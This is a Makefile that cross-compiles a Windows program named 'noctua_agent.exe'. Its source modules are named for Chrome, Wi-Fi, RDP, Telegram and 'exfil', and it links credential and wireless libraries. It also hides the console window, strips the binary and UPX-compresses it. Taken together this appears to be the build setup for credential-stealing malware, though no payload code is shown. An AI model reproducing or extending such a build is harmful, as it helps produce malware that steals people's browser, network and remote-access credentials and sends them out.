# NOCTUA Agent Makefile
# Cross-compile for Windows x64 using MinGW
# Usage: make            - Build agent
#        make release    - Build stripped release
#        make upx        - Build and UPX compress
#        make clean      - Clean build artifacts

CXX = x86_64-w64-mingw32-g++
RC  = x86_64-w64-mingw32-windres
UPX = upx

# Compiler flags
CXXFLAGS = -Os -s -fvisibility=hidden -std=c++11
CXXFLAGS += -fno-stack-protector -fomit-frame-pointer
CXXFLAGS += -ffunction-sections -fdata-sections
CXXFLAGS += -Wl,--gc-sections -Wl,--strip-all
CXXFLAGS += -mwindows
CXXFLAGS += -D_UNICODE -DUNICODE -DWIN32_LEAN_AND_MEAN
CXXFLAGS += -I src

# Linker flags
LDFLAGS = -static-libgcc -static-libstdc++
LDFLAGS += -mwindows -Wl,--subsystem,windows

# Libraries
LIBS = -lcrypt32 -lsecur32 -lwininet -lws2_32 -lole32 -lcredui -lwlanapi -lshlwapi -lshell32

# Source files
SRCS = src/main.cpp src/chrome.cpp src/wifi.cpp src/rdp.cpp src/telegram.cpp src/exfil.cpp

# Object files
OBJS = $(SRCS:.cpp=.o)

# Output
TARGET = noctua_agent.exe

.PHONY: all clean release upx

all: $(TARGET)

$(TARGET): $(OBJS)
	$(CXX) $(CXXFLAGS) $(LDFLAGS) -o $@ $^ $(LIBS)
	@echo "Built: $(TARGET)"
	@ls -lh $(TARGET)

%.o: %.cpp
	$(CXX) $(CXXFLAGS) -c -o $@ $<

release: CXXFLAGS += -DNDEBUG
release: $(TARGET)

upx: release
	@if command -v $(UPX) >/dev/null 2>&1; then \
		$(UPX) --best --ultra-brute $(TARGET); \
		ls -lh $(TARGET); \
	else \
		echo "UPX not found, skipping compression"; \
	fi

clean:
	rm -f $(OBJS) $(TARGET)
	@echo "Cleaned."
